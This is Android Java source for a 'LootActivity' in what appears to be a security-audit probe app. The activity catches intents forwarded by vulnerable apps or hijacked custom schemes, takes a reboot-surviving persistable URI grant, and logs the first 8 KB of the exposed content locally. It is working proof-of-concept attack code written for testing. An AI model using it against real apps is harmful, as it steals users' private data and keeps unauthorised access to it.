package com.sanehunters.probe;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/**
 * Receives whatever a victim component forwards to us and records, as PROBE|loot|... lines, what the
 * forwarded grant lets this zero-permission app read. Also the landing point for the `picanary` step and,
 * when built with `./build.sh --hijack-scheme <scheme>`, for a hijacked custom scheme (D09): every query
 * parameter of the received URI is printed as PROBE|loot|query|<k>=<v>.
 * Read with:  adb logcat -s PROBE:V   (or pull the file mirror, see Probe.java)
 */
public class LootActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent i = getIntent();
        log("PROBE|loot|reached=true|action=" + i.getAction() + "|data=" + i.getData() + "|flags=0x" + Integer.toHexString(i.getFlags())
                + "|caller=" + (getCallingPackage() == null ? "unknown(not forResult)" : getCallingPackage()) + "|referrer=" + referrer());
        if (i.getExtras() != null)
            for (String k : i.getExtras().keySet()) log("PROBE|loot|extra=" + k + "|value=" + String.valueOf(i.getExtras().get(k)));
        Uri granted = i.getData();
        if (granted != null) {
            if (granted.isHierarchical())
                try { for (String k : granted.getQueryParameterNames()) log("PROBE|loot|query|" + k + "=" + granted.getQueryParameter(k)); }
                catch (Throwable t) { log("PROBE|loot|query_parse_failed=" + t); }
            boolean read  = (i.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION)  != 0;
            boolean write = (i.getFlags() & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) != 0;
            log("PROBE|loot|grant_read=" + read + "|grant_write=" + write);
            if ("content".equals(granted.getScheme())) {
                try {
                    getContentResolver().takePersistableUriPermission(granted, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    log("PROBE|loot|persistable=taken (survives reboot)");
                } catch (Throwable t) { log("PROBE|loot|persistable=no (" + t + ")"); }
                dump(granted);
            }
        }
        if (i.getBooleanExtra("probe_setresult", false) || getCallingActivity() != null)
            setResult(RESULT_OK, new Intent().putExtra("probe_result", "loot-seen"));
        finish();
    }

    private String referrer() {
        try { return String.valueOf(android.os.Build.VERSION.SDK_INT >= 22 ? getReferrer() : null); } catch (Throwable t) { return "failed"; }
    }
    private void log(String line) { Probe.log(this, line); }

    private void dump(Uri u) {
        try (InputStream in = getContentResolver().openInputStream(u)) {
            if (in == null) { log("PROBE|loot|openInputStream=null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            log("PROBE|loot|bytes=" + total + "|uri=" + u + " (READ via forwarded grant; declared permissions NONE)");
            log("PROBE|loot|head=" + bo.toString().replace('\n', ' '));
        } catch (Throwable t) {
            log("PROBE|loot|read_failed=" + t);
        }
    }
}
